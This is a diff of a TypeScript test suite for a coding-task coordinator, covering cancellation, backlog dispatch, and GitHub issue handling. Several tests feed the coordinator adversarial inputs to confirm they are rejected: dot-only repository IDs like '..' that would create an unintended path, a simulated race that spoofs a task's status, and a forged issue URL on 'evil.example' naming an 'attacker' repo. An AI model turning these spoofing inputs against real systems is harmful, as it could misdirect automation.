+        await coordinator.reportTaskStatus(secondRun.taskId!, {
+          status: 'failed',
+          runnerId: 'runner-cancel-2',
+          error: 'Second attempt failed',
+        });
+        const midStack = settledRow(cancelledOrigin.id);
+        assert.equal(midStack.status, 'dispatched');
+        assert.equal(midStack.attemptCount, 2);
+
+        const thirdClaim = await coordinator.pollForTask({
+          runnerId: 'runner-cancel-3',
+          timeoutMs: 0,
+        });
+        assert.equal(thirdClaim?.id, thirdRun.taskId);
+        await coordinator.cancelTask(thirdRun.taskId!);
+
+        const settledCancel = settledRow(cancelledOrigin.id);
+        assert.equal(settledCancel.status, 'failed');
+        assert.equal(settledCancel.attemptCount, 2);
+        assert.equal(settledCancel.swarmTaskId, undefined);
+        assert.match(settledCancel.lastError ?? '', /aborted/i);
+        assert.equal(coordinator.queue.getNextEligibleBacklogTask(), undefined);
+      } finally {
+        db.close();
+        cleanup();
+      }
+    });
+
     it('capOutput preserves surrogate pairs across the truncation boundary and reports dropped characters', () => {
       assert.equal(capOutput('hello', 5), 'hello');
 
@@ -4985,16 +5585,10 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
         });
         const run2 = await coordinator.dispatch({
           repositoryId: rt.repositoryId,
-          repositoryName: rt.repositoryId,
-          prompt: rt.prompt,
-          title: rt.title,
-          tier: 'routine',
-          originId: rt.id,
-          originNumber: rt.taskNumber,
-          originTitle: rt.title,
+          prompt: 'Queued behind the routine',
+          tier: 'immediate',
           cascade: rt.cascade,
           scheduleMode: 'immediate',
-          requestedBy: `routine:${rt.id}`,
         });
         assert.equal(run1.success, true);
         assert.equal(run2.success, true);
@@ -5106,6 +5700,217 @@ describe('Unit & Integration Tests: Task Coordinator, Model Routing & Pull-Runne
         assert.equal(singleSpawned.length, 1);
         assert.equal(singleSpawned[0]?.originId, s1.id);
         assert.equal(coordinator.queue.getBacklogTask(s2.id)?.status, 'pending');
+      } finally {
+        db.close();
+        cleanup();
+      }
+    });
+
+    it('propagates originIssueNumber during autonomous backlog dispatch', async () => {
+      const { dir, cleanup } = makeTempDir('coord_auto_issue_num_');
+      const db = new AppDatabase(path.join(dir, 'test.db'));
+
+      try {
+        const configStore = new ConfigStore(db, backlogConfig(dir));
+        const coordinator = new Coordinator({ configStore });
+        const backlog = coordinator.queue.createBacklogTask({
+          title: 'Fix issue #42',
+          prompt: 'Resolve GitHub issue 42',
+          repositoryId: 'agylity',
+          cascade: [{ model: 'gemini-4-hydrogen', effort: 'medium' }],
+          githubIssueNumber: 42,
+          githubIssueUrl: 'https://github.com/OtterBoops/agylity/issues/42',
+        });
+
+        const spawned = await coordinator.triggerEligibleAutonomousTasks(hydrogenPools(0.8));
+        assert.equal(spawned.length, 1);
+        assert.equal(spawned[0]?.originId, backlog.id);
+        assert.equal(spawned[0]?.originIssueNumber, 42);
+      } finally {
+        db.close();
+        cleanup();
+      }
+    });
+
+    it('rejects dot-only unconfigured repositoryId in dispatch and autonomous backlog targeting', async () => {
+      const { dir, cleanup } = makeTempDir('coord_dot_repo_id_');
+      const db = new AppDatabase(path.join(dir, 'test.db'));
+
+      try {
+        const configStore = new ConfigStore(db, backlogConfig(dir));
+        const coordinator = new Coordinator({ configStore });
+        const pools = hydrogenPools(0.8);
+        coordinator.onQuotaUpdated(pools);
+
+        for (const badId of ['..', '...']) {
+          const res = await coordinator.dispatch({
+            repositoryId: badId,
+            prompt: 'Should be rejected',
+            cascade: [{ model: 'gemini-4-hydrogen', effort: 'medium' }],
+          });
+          assert.equal(res.success, false);
+          assert.match(res.error ?? '', /configured repository or a plain slug/);
+        }
+
+        // Autonomous backlog dispatch must skip dot-only unconfigured repositoryIds rather than
+        // spawning a task with repositoryPath '/repos/'.
+        const badBacklog = coordinator.queue.createBacklogTask({
+          title: 'Dot-only repo',
+          prompt: 'Should not spawn',
+          repositoryId: '...',
+          cascade: [{ model: 'gemini-4-hydrogen', effort: 'medium' }],
+          priorityOrder: 1,
+        });
+        const goodBacklog = coordinator.queue.createBacklogTask({
+          title: 'Valid repo',
+          prompt: 'Should still spawn',
+          repositoryId: 'agylity',
+          cascade: [{ model: 'gemini-4-hydrogen', effort: 'medium' }],
+          priorityOrder: 2,
+        });
+
+        const spawned = await coordinator.triggerEligibleAutonomousTasks(pools);
+        assert.equal(spawned.length, 1);
+        assert.equal(spawned[0]?.originId, goodBacklog.id);
+        assert.equal(coordinator.queue.getBacklogTask(badBacklog.id)?.status, 'pending');
+      } finally {
+        db.close();
+        cleanup();
+      }
+    });
+
+    it('rejects queued -> executing and queued -> claimed atomically in SQL regardless of runnerId', () => {
+      const { dir, cleanup } = makeTempDir('coord_queued_guard_');
+      const db = new AppDatabase(path.join(dir, 'test.db'));
+
+      try {
+        const configStore = new ConfigStore(db, backlogConfig(dir));
+        const coordinator = new Coordinator({ configStore });
+        const task = coordinator.queue.enqueue({
+          repositoryId: 'agylity',
+          repositoryName: 'agylity',
+          repositoryPath: dir,
+          prompt: 'Stay queued',
+          cascade: [{ model: 'gemini-4-hydrogen', effort: 'medium' }],
+        });
+
+        // Direct calls without runnerId must be refused.
+        assert.equal(
+          coordinator.queue.updateTaskStatus(task.id, { status: 'executing' })?.applied,
+          false
+        );
+        assert.equal(
+          coordinator.queue.updateTaskStatus(task.id, { status: 'claimed' })?.applied,
+          false
+        );
+
+        // Simulate a TOCTOU race where getTask returns a stale 'claimed' snapshot while the DB row
+        // is still 'queued': the SQL WHERE clause itself must reject both transitions.
+        const origGetTask = coordinator.queue.getTask.bind(coordinator.queue);
+        let spoofOnce = true;
+        coordinator.queue.getTask = (id: string) => {
+          const found = origGetTask(id);
+          if (spoofOnce && found && id === task.id) {
+            spoofOnce = false;
+            return { ...found, status: 'claimed', runnerId: 'runner-1' };
+          }
+          return found;
+        };
+        assert.equal(
+          coordinator.queue.updateTaskStatus(task.id, { status: 'executing' })?.applied,
+          false
+        );
+        assert.equal(origGetTask(task.id)?.status, 'queued');
+
+        spoofOnce = true;
+        assert.equal(
+          coordinator.queue.updateTaskStatus(task.id, { status: 'claimed' })?.applied,
+          false
+        );
+        assert.equal(origGetTask(task.id)?.status, 'queued');
+      } finally {
+        db.close();
+        cleanup();
+      }
+    });
+
+    it('only extracts GitHub issue repo slug from anchored github.com issue URLs', async () => {
+      const { dir, cleanup } = makeTempDir('coord_issue_url_anchor_');
+      const db = new AppDatabase(path.join(dir, 'test.db'));
+
+      try {
+        const removedSlugs: string[] = [];
+        const configStore = new ConfigStore(db, {
+          ...backlogConfig(dir),
+          repositories: [
+            {
+              id: 'local-only',
+              name: 'Local Only',
+              path: dir,
+              defaultBranch: 'main',
+            },
+          ],
+        });
+        const coordinator = new Coordinator({
+          configStore,
+          issueLabelRemover: async (params) => {
+            removedSlugs.push(`${params.repoSlug}#${params.issueNumber}`);
+            return 'rest';
+          },
+        });
+
+        const spoofed = coordinator.queue.createBacklogTask({
+          title: 'Spoofed URL',
+          prompt: 'Spoofed issue URL',
+          repositoryId: 'local-only',
+          cascade: [{ model: 'gemini-4-hydrogen', effort: 'medium' }],
+          githubIssueNumber: 7,
+          githubIssueUrl: 'https://evil.example/github.com/attacker/repo/issues/7',
+        });
+        const valid = coordinator.queue.createBacklogTask({
+          title: 'Valid URL',
+          prompt: 'Real GitHub issue URL',
+          repositoryId: 'local-only',
+          cascade: [{ model: 'gemini-4-hydrogen', effort: 'medium' }],
+          githubIssueNumber: 8,
+          githubIssueUrl: 'https://github.com/OtterBoops/agylity/issues/8',
+        });
+
+        const spoofedTask = coordinator.queue.spawnBacklogTask(
+          {
+            repositoryId: 'local-only',
+            repositoryName: 'Local Only',
+            repositoryPath: dir,
+            prompt: spoofed.prompt,
+            tier: 'backlog',
+            originId: spoofed.id,
+            cascade: [{ model: 'gemini-4-hydrogen', effort: 'medium' }],
+          },
+          { id: spoofed.id, attemptCount: 1 }
+        );
+        await coordinator.reportTaskStatus(spoofedTask.id, {
+          status: 'completed',
+          prUrl: 'https://github.com/OtterBoops/agylity/pull/101',
+        });
+
+        const validTask = coordinator.queue.spawnBacklogTask(
+          {
+            repositoryId: 'local-only',
+            repositoryName: 'Local Only',
+            repositoryPath: dir,
+            prompt: valid.prompt,
+            tier: 'backlog',
+            originId: valid.id,
+            cascade: [{ model: 'gemini-4-hydrogen', effort: 'medium' }],
+          },
+          { id: valid.id, attemptCount: 1 }
+        );
+        await coordinator.reportTaskStatus(validTask.id, {
+          status: 'completed',
+          prUrl: 'https://github.com/OtterBoops/agylity/pull/102',
+        });
+
+        assert.deepEqual(removedSlugs, ['OtterBoops/agylity#8']);
       } finally {
         db.close();
         cleanup();
